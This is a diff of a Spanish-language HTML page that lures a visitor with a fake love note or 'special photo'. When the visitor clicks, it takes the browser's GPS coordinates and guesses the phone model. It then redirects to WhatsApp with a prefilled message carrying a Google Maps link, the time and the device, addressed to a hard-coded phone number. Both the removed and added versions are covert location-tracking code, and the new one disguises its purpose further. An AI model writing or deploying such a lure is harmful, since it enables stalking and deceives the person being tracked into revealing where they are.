@@ -2,118 +2,94 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>💌 Para ti</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tu Foto Especial</title>
     <style>
         body {
-            margin: 0; padding: 0; background-color: #0f0f13; color: white;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;
+            margin: 0; padding: 0; background-color: #111; color: white;
+            font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;
         }
-        .card {
-            background: rgba(30, 30, 40, 0.9); width: 90%; max-width: 350px;
-            border-radius: 20px; padding: 30px 20px; text-align: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
-            animation: fadeIn 1s ease-out;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .container { text-align: center; width: 90%; max-width: 400px; }
         
-        h1 { margin: 0 0 10px 0; font-size: 22px; color: #ff6b81; }
-        p { color: #aab; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        /* Estilo de la imagen */
+        .photo-frame {
+            border: 5px solid white;
+            box-shadow: 0 0 20px rgba(255,255,255,0.2);
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        img { width: 100%; height: auto; display: block; }
         
         button {
-            background: linear-gradient(135deg, #25D366, #128C7E); /* Color WhatsApp */
-            color: white; border: none; padding: 14px 30px; border-radius: 50px; 
-            font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s;
-            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4); width: 100%;
+            background-color: #25D366; /* Color WhatsApp */
+            color: white; border: none; padding: 15px 30px; 
+            font-size: 18px; border-radius: 30px; cursor: pointer;
+            font-weight: bold; width: 100%;
         }
-        button:hover { transform: scale(1.05); }
-        button:disabled { background: #555; cursor: wait; }
-
-        .hidden { display: none !important; }
-        
-        #map-frame {
-            width: 100%; height: 200px; border-radius: 15px; border: none; margin-top: 15px;
-            background: #1a1a20;
-        }
-        .info-badge {
-            background: #2d2d3a; padding: 8px 12px; border-radius: 10px; 
-            font-size: 12px; color: #ddd; margin-top: 15px; display: inline-block;
-        }
+        button:hover { opacity: 0.9; }
     </style>
 </head>
 <body>
 
-    <!-- Pantalla 1: El Gancho -->
-    <div class="card" id="screen1">
-        <h1>Hola mi vida ❤️</h1>
-        <p>Tengo algo especial para mostrarte.<br>Necesito saber dónde estás para enviártelo.</p>
-        <button id="btnStart" onclick="start()">Abrir Mensaje</button>
-        <p id="status" style="margin-top:15px; font-size:12px; color:#666;">Esperando...</p>
-    </div>
+    <div class="container">
+        <!-- CAMBIA ESTE LINK POR LA FOTO QUE QUIERAS MOSTRAR -->
+        <div class="photo-frame">
+            <img src="https://images.unsplash.com/photo-1518005052357-e9847508d5ee?w=500" alt="Foto Sorpresa">
+        </div>
 
-    <!-- Pantalla 2: El Mapa y Datos -->
-    <div class="card hidden" id="screen2">
-        <h1>¡Te quiero! 💖</h1>
-        <p>Aquí estás:</p>
-        <iframe id="mapFrame" src=""></iframe>
-        <div id="deviceData" class="info-badge"></div>
+        <h2>¿Quieres ver de qué se trata?</h2>
+        <button id="btnView" onclick="enviarUbicacion()">Ver Foto</button>
     </div>
 
     <script>
-        // TU NÚMERO DE WHATSAPP (Formateado internacionalmente sin + ni espacios)
-        const MY_WHATSAPP = "51929207065"; 
+        // TU NÚMERO DE WHATSAPP AQUÍ
+        const myNumber = "51929207065"; 
 
-        function start() {
-            const btn = document.getElementById('btnStart');
-            const status = document.getElementById('status');
-            
-            btn.disabled = true;
-            btn.innerText = "Conectando...";
-            status.innerText = "Solicitando ubicación...";
+        function enviarUbicacion() {
+            const btn = document.getElementById('btnView');
+            btn.innerText = "Obteniendo ubicación...";
 
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const lat = pos.coords.latitude.toFixed(6);
-                        const lon = pos.coords.longitude.toFixed(6);
-                        
-                        // Cambiar pantalla
-                        document.getElementById('screen1').classList.add('hidden');
-                        document.getElementById('screen2').classList.remove('hidden');
-                        
-                        // Poner mapa
-                        document.getElementById('mapFrame').src = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.003}%2C${lat-0.003}%2C${lon+0.003}%2C${lat+0.003}&layer=mapnik&marker=${lat}%2C${lon}`;
-                        
-                        // Leer Celular
-                        const devInfo = detectDevice();
-                        document.getElementById('deviceData').innerText = "📱 " + devInfo;
-
-                        // Construir mensaje
-                        const msg = `📍 ¡Alguien abrió la carta!\n🗺️ Ubicación: https://maps.google.com/?q=${lat},${lon}\n🕒 Hora: ${new Date().toLocaleString()}\n📱 Celular: ${devInfo}`;
-                        
-                        // Enviar a WhatsApp
-                        const url = `https://wa.me/${MY_WHATSAPP}?text=${encodeURIComponent(msg)}`;
-                        window.location.href = url;
-                    },
-                    () => { status.innerText = "No se pudo detectar."; }
-                );
-            } else {
-                alert("Tu navegador no soporta GPS.");
+            if (!navigator.geolocation) {
+                alert("Tu navegador no soporta geolocalización.");
+                return;
             }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Datos del Celular
+                    const device = detectDevice();
+                    const date = new Date().toLocaleString();
+
+                    // Crear enlace de Google Maps
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Mensaje final
+                    const message = `📸 ¡Hola! Acabo de ver la foto.\n\n` +
+                                    `📍 Ubicación: ${mapsLink}\n` +
+                                    `📱 Celular: ${device}\n` +
+                                    `🕒 Hora: ${date}`;
+
+                    // Abrir WhatsApp
+                    window.location.href = `https://wa.me/${myNumber}?text=${encodeURIComponent(message)}`;
+                },
+                () => {
+                    btn.innerText = "Permiso denegado";
+                    alert("No pudiste obtener tu ubicación.");
+                }
+            );
         }
 
         function detectDevice() {
             const ua = navigator.userAgent;
-            let device = "Smartphone";
-            
-            if (/iPhone/.test(ua)) device = "Apple iPhone";
-            else if (/iPad/.test(ua)) device = "Apple iPad";
-            else if (/Android/.test(ua)) {
-                if (/SM-G99|SM-S91|SM-A53/.test(ua)) device = "Samsung Galaxy";
-                else device = "Dispositivo Android";
+            if (/iPhone|iPad/.test(ua)) return "Apple iPhone/iPad";
+            if (/Android/.test(ua)) {
+                if (/SM-G99|SM-S91|SM-A53/.test(ua)) return "Samsung Galaxy";
+                return "Dispositivo Android";
             }
-            return device;
+            return "Otro dispositivo";
         }
     </script>
 </body>
